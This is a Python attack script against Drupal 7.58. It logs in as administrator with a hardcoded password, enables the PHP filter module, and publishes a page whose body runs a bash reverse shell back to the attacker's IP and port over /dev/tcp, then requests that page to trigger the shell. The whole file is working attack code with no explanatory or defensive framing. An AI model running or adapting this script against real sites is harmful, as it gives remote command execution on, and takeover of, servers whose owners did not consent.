#drupal 7.58 reverse shell php filter
#remove proxies if not needed
import requests
import sys
from bs4 import BeautifulSoup

proxies = {'http':'http://127.0.0.1:8080'}

if len(sys.argv) < 5:
	print("(+) usage: %s <target> user:pass <your_ip> <your_port>" % sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
yourip=sys.argv[3]
yourPORT=sys.argv[4]


try:
    user   = sys.argv[2].split(":")[0]
    pswd   = sys.argv[2].split(":")[1]
except:
    print("(-) username and password needs to be in the format \"user:pass\"")
    sys.exit(-1)

s=requests.session()


r=s.get("http://"+target+"/")

#extracting form_build_id
soup = BeautifulSoup(r.content, 'html.parser')
print("finding form_build_id")
form_build_id_src=soup.find('input',{'name':'form_build_id'})['value']
print("form_build_id: "+ form_build_id_src)

data={
	'name':'admin',
	'pass':'PencilKeyboardScanner123',
	'from_build_id':form_build_id_src,
	'form_id':'user_login_block',
	'op':'Log in' 
}

r=s.post("http://"+target+"/node?destination=node",data=data,proxies=proxies,allow_redirects=True)

soup=BeautifulSoup(r.content,'html.parser')
print("finding form_token")
form_token_src = soup.find('input',{'name':'form_token'})['value']
print("form_token: "+ form_token_src)


data={
	'modules[Core][color][enable]':'1',
	'modules[Core][comment][enable]':'1',
	'modules[Core][contextual][enable]':'1',
	'modules[Core][dashboard][enable]':'1',
	'modules[Core][dblog][enable]':'1',
	'modules[Core][field_ui][enable]':'1',
	'modules[Core][help][enable]':'1',
	'modules[Core][list][enable]':'1',
	'modules[Core][menu][enable]':'1',
	'modules[Core][number][enable]':'1',
	'modules[Core][overlay][enable]':'1',
	'modules[Core][path][enable]':'1',
	'modules[Core][php][enable]':'1',
	'modules[Core][rdf][enable]':'1',
	'modules[Core][search][enable]':'1',
	'modules[Core][shortcut][enable]':'1',
	'modules[Core][toolbar][enable]':'1',
	'form_build_id':form_build_id_src,
	'form_token':form_token_src,
	'form_id':'system_modules',
	'op':'Save configuration',
}

r=s.post("http://"+target+"/admin/modules/list/confirm?render=overlay", data=data, proxies=proxies)

data={
	'title':'hello',
	'body[und][0][summary]':'',
	'body[und][0][value]':'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/'+yourip+'/'+yourPORT+' 0>&1\'"); ?>',
	'body[und][0][format]':'php_code',
	'changed':'',
	'form_build_id':form_build_id_src,
	'form_token':form_token_src,
	'form_id':'page_node_form',
	'menu[link_title]':'',
	'menu[description]':'',
	'menu[parent]':'main-menu:0',
	'menu[weight]':'0',
	'log':'',
	'comment':'1',
	'path[alias]':'',
	'name':'admin',
	'date':'',
	'status':'1',
	'additional_settings__active_tab':'edit-menu',
	'op':'Save',
}

r=s.post("http://"+target+"/node/add/page?render=overlay&render=overlay", data=data, proxies=proxies, allow_redirects=True)

r=s.get("http://"+target+"/node/1", proxies=proxies)
